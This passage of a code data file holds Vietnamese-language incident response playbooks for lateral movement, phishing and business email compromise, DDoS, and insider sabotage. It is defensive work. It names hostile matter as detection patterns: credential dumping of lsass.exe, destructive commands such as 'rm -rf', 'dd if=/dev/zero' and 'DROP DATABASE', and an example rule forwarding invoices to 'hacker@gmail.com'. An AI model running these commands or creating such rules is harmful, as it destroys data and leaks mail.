        content: '**Phát hiện hành vi đánh cắp mật khẩu:**\n- Hacker thường sử dụng Mimikatz, Procdump hoặc các công cụ tương tự để dump bộ nhớ RAM của tiến trình `lsass.exe`.\n- Kiểm tra Windows Event Logs (Sysmon Event ID 10 hoặc Security Event ID 4656/4663) tìm kiếm các tiến trình khác cố gắng yêu cầu quyền `PROCESS_VM_READ` đối với `lsass.exe`.\n- Rà soát các tệp có đuôi `.dmp` (ví dụ: `lsass.dmp`) lưu trong thư mục Temp hoặc AppData.',
        icon: 'Key'
      },
      {
        title: 'Bước 2: Phân tích Đăng nhập Mạng (Logon Type 3)',
        content: '**Xác minh kỹ thuật Pass-the-Hash / Overpass-the-Hash:**\n- Tập trung phân tích Security Event ID 4624 (Logon Success). Lọc ra các sự kiện có `Logon Type = 3` (Network Logon).\n- Loại bỏ các logs thông thường (File share bình thường) và chú ý vào các lần đăng nhập mạng từ các máy trạm (Workstations) tới các máy chủ quan trọng (Servers) bằng tài khoản quản trị (Domain Admin).\n- Phát hiện sự bất thường về mật độ đăng nhập từ một nguồn duy nhất IP (dấu hiệu của BloodHound / Sharphound).',
        icon: 'UserCheck'
      },
      {
        title: 'Bước 3: Phát hiện Thực thi Lệnh Từ xa',
        content: '**Truy vết PsExec, WMI, WinRM:**\n- Khi di chuyển ngang thành công, hacker phải thực thi lệnh trên máy đích.\n- **PsExec:** Tìm kiếm Event ID 7045 (Service Control Manager) với dịch vụ tên `PSEXESVC` hoặc các service name được sinh ngẫu nhiên chứa file thực thi nằm trong thư mục `C:\\Windows\\`.\n- **WMI:** Truy tìm các tiến trình `WmiPrvSE.exe` sinh ra các tiến trình con đáng ngờ (`cmd.exe`, `powershell.exe`).\n- **WinRM/RDP:** Phân tích logs truy cập RDP ngoài giờ hành chính hoặc Event ID đăng nhập Remote Interactive (Type 10).',
        icon: 'Terminal'
      },
      {
        title: 'Bước 4: Rà soát Quản trị AD (Privilege Escalation)',
        content: '**Phát hiện tài khoản được nhúng quyền:**\n- Lọc Event ID 4728, 4732, 4756 (A member was added to a security-enabled global/local/universal group) để xem có user nào đột ngột được cấp quyền Domain Admins hoặc Enterprise Admins.\n- Chạy PowerShell script `Get-ADGroupMember -Identity "Domain Admins"` và đối chiếu định kỳ với danh sách chuẩn.',
        icon: 'Shield'
      }
    ],
    references: [
      { title: 'MITRE ATT&CK: Lateral Movement (TA0008)', url: 'https://attack.mitre.org/tactics/TA0008/' },
      { title: 'Microsoft: Báo cáo kỹ thuật Lateral Movement', url: 'https://www.microsoft.com/en-us/security/business/security-101/what-is-lateral-movement' }
    ]
  },
  {
    id: 'phishing-bec',
    title: 'Phishing & Business Email Compromise (BEC)',
    description: 'Quy trình ứng phó khẩn cấp khi tài khoản email doanh nghiệp (M365, Google Workspace) bị chiếm đoạt thông qua Phishing. Hướng dẫn cách phân tích nguồn gốc email, ngăn chặn phát tán nội bộ và thu hồi quyền truy cập của kẻ tấn công.',
    type: 'Incident Response',
    platforms: ['M365', 'Google Workspace', 'Exchange'],
    mitre: 'T1566 (Phishing) & T1078 (Valid Accounts)',
    color: 'emerald',
    icon: 'Briefcase',
    goals: [
      'Containment: Cách ly ngay lập tức tài khoản bị xâm phạm, thu hồi mọi phiên đăng nhập (Revoke Sessions) và cưỡng chế MFA.',
      'Analysis: Phân tích Header Email, Sandboxing tệp đính kèm và kiểm tra các đường dẫn (URLs) lừa đảo.',
      'Detection: Săn lùng các quy tắc hộp thư (Inbox Rules) lạ dùng để ẩn dấu vết hoặc tự động chuyển tiếp (Forward) email nhạy cảm.',
      'Eradication: Xóa bỏ các email lừa đảo khỏi hòm thư của những người dùng khác (Purge).' 
    ],
    steps: [
      {
        title: 'Bước 1: Cách ly & Bảo vệ Tài khoản (Containment)',
        content: '**Hành động khẩn cấp:**\n- Đăng nhập vào Admin Center (M365/G-Workspace) và **Revoke Sign-in Sessions** của tài khoản bị nghi ngờ xâm phạm.\n- Reset mật khẩu ngay lập tức bằng một mật khẩu mạnh ngẫu nhiên.\n- Bật tính năng **MFA (Multi-Factor Authentication)** nếu tài khoản này chưa được kích hoạt.\n- Gỡ bỏ bất kỳ ứng dụng OAuth 3rd-party nào đáng ngờ được cấp quyền bởi user này.',
        icon: 'Lock'
      },
      {
        title: 'Bước 2: Săn tìm Email Header & Payload',
        content: '**Truy vết nguồn gốc Email lừa đảo:**\n- Lấy file email gốc (`.eml` hoặc `.msg`) và phân tích Header qua công cụ MxToolBox hoặc Google Admin Toolbox.\n- Kiểm tra các trường: `Return-Path`, `Reply-To`, `Received` (IP gốc của sender).\n- Xác minh kết quả SPF, DKIM, và DMARC. Thường email giả mạo (Spoofing) sẽ fail các bước kiểm tra này.\n- Bóc xuất các tệp đính kèm (`.docx`, `.pdf`, `.zip`) và tải lên Cuckoo Sandbox hoặc VirusTotal để phân tích động/tĩnh.',
        icon: 'Search'
      },
      {
        title: 'Bước 3: Rà soát Audit Logs & Inbox Rules',
        content: '**Xác định hành vi của kẻ tấn công:**\n- Truy cập M365 Unified Audit Log / Google Workspace Reports.\n- Lọc các sự kiện đăng nhập (Logon Events) để xem kẻ tấn công đã đăng nhập từ IP, vị trí địa lý, và User-Agent nào.\n- Kiểm tra các **Inbox Rules / Forwarding Rules**. Kẻ tấn công thường tạo rule: `IF subject contains "invoice" THEN forward to hacker@gmail.com AND move to RSS Feeds folder`.\n- Xóa ngay lập tức các rule độc hại này.',
        icon: 'FileText'
      },
      {
        title: 'Bước 4: Purge & Thông báo (Remediation)',
        content: '**Dọn dẹp hòm thư nội bộ:**\n- Dùng PowerShell (M365) hoặc G-Workspace Security Center để tìm kiếm tất cả các mailbox nội bộ đã nhận được email lừa đảo này.\n- Thực hiện lệnh Soft-Delete hoặc Hard-Delete (Purge) các email đó khỏi hòm thư người dùng để tránh có thêm nạn nhân.\n- Phát thông báo nội bộ (Security Awareness) cảnh báo nhân viên về chiến dịch lừa đảo đang diễn ra.',
        icon: 'Target'
      }
    ],
    references: [
      { title: 'NIST SP 800-61 Rev. 2: Phân loại sự cố Email', url: 'https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final' },
      { title: 'CISA: Ứng phó Business Email Compromise', url: 'https://www.cisa.gov/stopransomware/business-email-compromise' }
    ]
  },
  {
    id: 'ddos-response',
    title: 'Denial of Service (DDoS) Response',
    description: 'Quy trình xử lý sự cố ngập lụt băng thông (Volumetric DDoS) hoặc cạn kiệt tài nguyên ứng dụng (Application Layer 7 DDoS) theo tiêu chuẩn NIST.',
    type: 'Incident Response',
    platforms: ['Network', 'Web', 'Cloud'],
    mitre: 'T1498 (Network Denial of Service)',
    color: 'rose',
    icon: 'Activity',
    goals: [
      'Visibility: Nhanh chóng phân loại tấn công là ở tầng Mạng (Layer 3/4) hay tầng Ứng dụng (Layer 7).',
      'Containment: Kích hoạt các biện pháp giảm thiểu (Mitigation) như BGP Blackholing, Rate Limiting, WAF "Under Attack Mode".',
      'Investigation: Phân tích PCAP/Netflow hoặc Access Logs để trích xuất chữ ký (Signature) của cuộc tấn công (User-Agent lạ, IP spoofing).',
      'Remediation: Scale tài nguyên hệ thống (Auto-scaling) hoặc định tuyến qua CDN bảo vệ.'
    ],
    steps: [
      {
        title: 'Bước 1: Phân loại cuộc tấn công (Triage)',
        content: '**Xác định bản chất DDoS:**\n- **Layer 3/4 (Volumetric):** Kiểm tra biểu đồ giám sát mạng (PRTG, Zabbix) thấy băng thông vào (Inbound Traffic) tăng vọt bất thường (SYN Flood, UDP Amplification).\n- **Layer 7 (Application):** Băng thông mạng bình thường nhưng CPU/RAM của Web Server, Database lên 100%. Các HTTP GET/POST request gửi dồn dập vào các trang nặng (Search, Login).\n- **Lưu ý:** DDoS đôi khi chỉ là màn khói (Smokescreen) che đậy cho việc hacker đang chọc thủng Data Breach ở một hệ thống khác. Vẫn phải giám sát logs an ninh tổng thể.',
        icon: 'Activity'
      },
      {
        title: 'Bước 2: Phân tích Lưu lượng (Analysis)',
        content: '**Trích xuất Pattern/Signature:**\n- Dùng lệnh `tcpdump -nn -c 1000 -w ddos.pcap` để bắt lưu lượng mẫu.\n- Mở PCAP trên Wireshark để phân tích độ dài gói tin, cờ TCP (Flags), cổng đích.\n- Đối với Layer 7: Sử dụng lệnh `awk \'{print $1}\' access.log | sort | uniq -c | sort -nr | head -20` để tìm ra Top 20 IP đang spam request.\n- Tìm kiếm các điểm chung: User-Agent lạ, đường dẫn bị spam, chuỗi truy vấn đặc biệt.',
        icon: 'Search'
      },
      {
        title: 'Bước 3: Kích hoạt Giảm thiểu (Mitigation)',
        content: '**Ngăn chặn lưu lượng rác:**\n- **Layer 3/4:** Liên hệ ngay với ISP hoặc kích hoạt BGP Null Routing/Blackholing đối với các IP mục tiêu bị tấn công để cứu hệ thống mạng chung.\n- **Layer 7:** \n  + Truy cập WAF/CDN (Cloudflare, AWS WAF, Akamai) kích hoạt tính năng **"Under Attack Mode"** (Yêu cầu giải Captcha/JS Challenge).\n  + Áp dụng Rate Limiting (VD: tối đa 50 requests / phút / IP) cho các URI bị nhắm mục tiêu.\n  + Cập nhật WAF rule chặn cụ thể User-Agent độc hại phát hiện được ở Bước 2.',
        icon: 'Shield'
      },
      {
        title: 'Bước 4: Phục hồi và Củng cố (Recovery)',
        content: '**Duy trì dịch vụ:**\n- Kích hoạt Auto-scaling để tăng số lượng instance cho Web Server / Database chịu tải tạm thời.\n- Khi lưu lượng giảm dần, theo dõi chặt chẽ thêm 24 giờ trước khi tắt các chế độ phòng vệ nghiêm ngặt.\n- Viết Post-Incident Report và xem xét mua các gói Anti-DDoS chuyên dụng (Scrubbing Center) nếu tần suất bị tấn công cao.',
        icon: 'Target'
      }
    ],
    references: [
      { title: 'NIST SP 800-61 Rev. 2: Attrition (DoS)', url: 'https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final' },
      { title: 'CISA: Hiểu và ứng phó DDoS', url: 'https://www.cisa.gov/news-events/cybersecurity-advisories/understanding-and-responding-distributed-denial-service-attacks' }
    ]
  },
  {
    id: 'insider-threat',
    title: 'Insider Threat & Sabotage',
    description: 'Quy trình đối phó với nhân viên nội bộ (Insider) lạm dụng đặc quyền để phá hoại dữ liệu (xóa Database, cấu hình sai hạ tầng) hoặc cố tình vô hiệu hóa các biện pháp bảo mật.',
    type: 'Incident Response',
    platforms: ['Windows', 'Linux', 'Cloud', 'Database'],
    mitre: 'T1485 (Data Destruction) & T1531 (Account Access Removal)',
    color: 'blue',
    icon: 'Briefcase',
    goals: [
      'Containment: Khóa khẩn cấp tài khoản nội bộ bị tình nghi và thu hồi quyền truy cập vật lý (thẻ từ, VPN).',
      'Evidence Preservation: Đảm bảo tính pháp lý (Chain of Custody) của logs Audit để phục vụ xử lý kỷ luật hoặc kiện tụng.',
      'Analysis: Phân tích Audit Logs của Database, Server, hoặc Cloud Console để xác định chính xác hành vi phá hoại (Lệnh xóa, thay đổi quyền).',
      'Recovery: Đánh giá thiệt hại và khôi phục dữ liệu từ bản sao lưu gần nhất.'
    ],
    steps: [
      {
        title: 'Bước 1: Khóa Đặc quyền (Immediate Containment)',
        content: '**Hành động không báo trước:**\n- Vô hiệu hóa (Disable) tài khoản Active Directory / VPN / M365 của nhân viên ngay lập tức.\n- Chặn thẻ từ truy cập vào Datacenter hoặc phòng máy chủ.\n- Thu hồi mọi session trên Cloud (AWS/Azure/GCP) và Reset các API keys mà nhân viên này từng được cấp quyền tạo.\n- Tạm giữ các thiết bị do công ty cấp phát (Laptop, Điện thoại) để phục vụ điều tra Forensic ngoại tuyến (Offline Forensic).',
        icon: 'Lock'
      },
      {
        title: 'Bước 2: Phân tích Log Phá hoại (Analysis)',
        content: '**Xác định bán kính thiệt hại:**\n- **Database:** Trích xuất Audit Logs (MySQL/PostgreSQL/SQL Server) hoặc SQL Profiler tìm kiếm các sự kiện thực thi lệnh `DROP DATABASE`, `DROP TABLE`, `DELETE FROM` không có điều kiện WHERE.\n- **Linux/Server:** Kiểm tra `.bash_history`, `auditd` logs tìm các lệnh `rm -rf`, `dd if=/dev/zero`.\n- **Windows:** Lọc Event ID 4660 (An object was deleted), 4656 (Handle to an object was requested) trên các file server.\n- **Cloud:** Phân tích AWS CloudTrail / Azure Activity Logs tìm kiếm hành vi `DeleteBucket`, `TerminateInstances`.',
        icon: 'Search'
      },
      {
        title: 'Bước 3: Thu thập Bằng chứng Pháp lý (Forensic Collection)',
        content: '**Bảo toàn tính pháp lý:**\n- Bất kỳ log hay bằng chứng nào trích xuất ra phải được mã băm (Hash SHA-256) ngay lập tức.\n- Tạo Disk Image (bản sao vật lý) của ổ cứng máy trạm của nhân viên thông qua bộ chặn ghi (Write-Blocker) để tìm kiếm các đoạn script hẹn giờ (Logic Bombs) hoặc bằng chứng trao đổi thông tin với đối thủ cạnh tranh.\n- Đóng băng các cuộn băng từ (Tape) hoặc Backup Storage để ngăn nhân viên đó kịp thời xóa cả bản sao lưu.',
        icon: 'Download'
      },
      {
        title: 'Bước 4: Đánh giá & Khôi phục (Recovery)',
        content: '**Khôi phục lại hiện trạng:**\n- Rà soát lại toàn bộ Backup logs để xác minh các bản sao lưu từ T-1 (ngày hôm qua) còn nguyên vẹn.\n- Kiểm tra và xóa bỏ các "Backdoor" nội bộ mà nhân viên này có thể đã tạo trước khi phá hoại (VD: tạo 1 admin account dự phòng khác).\n- Thực hiện khôi phục DB/Server và bàn giao hồ sơ điều tra cho bộ phận Pháp chế (Legal/HR) xử lý.',
        icon: 'Target'
      }
    ],
    references: [
      { title: 'NIST SP 800-61 Rev. 2: Inappropriate Usage', url: 'https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final' },
      { title: 'CISA: Insider Threat Mitigation Guide', url: 'https://www.cisa.gov/insider-threat-mitigation' }
    ]
  }
]
